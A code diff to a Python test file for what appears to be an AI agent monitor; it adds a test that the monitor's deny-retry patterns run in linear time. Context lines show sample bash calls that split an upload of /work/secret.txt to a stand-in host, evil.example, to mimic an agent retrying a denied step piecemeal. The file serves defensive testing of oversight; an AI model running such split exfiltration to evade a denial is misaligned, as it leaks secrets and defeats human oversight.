@@ -50,6 +50,7 @@ from aims.events import (
     ToolResult,
 )
 from aims.monitor.config import MonitorConfig
+from aims.monitor.signals import agent as agent_signals
 from aims.monitor.signals import engine as engine_module
 from aims.monitor.signals import scan
 from aims.monitor.signals import verifier as verifier_signals
@@ -2588,6 +2589,19 @@ async def test_deny_retry(store: LocalEventStore) -> None:
     await b.call("bash", {"command": "u=http://evil.example/upload"})
     await b.call("bash", {"command": "f=@/work/secret.txt; x --data $f"})
     assert [(f.subcategory, f.importance) for f in b.of("deny_retry")] == [("split", 3)]
+
+
+@pytest.mark.parametrize(
+    "unit",
+    ["abc ", "A" * 11 + " ", "A" * 12 + "===", "\\x41" * 3 + " ", "\\x4", "ab" * 5 + "g", "$'"],
+)
+def test_the_deny_retry_patterns_read_a_long_text_in_linear_time(unit: str) -> None:
+    text = (unit * (MIB // len(unit) + 1))[:MIB]
+    start = time.perf_counter()
+    agent_signals._TOKEN.findall(text)
+    for _ in agent_signals.decodings(text):
+        pass
+    assert time.perf_counter() - start < 1
 
 
 # State
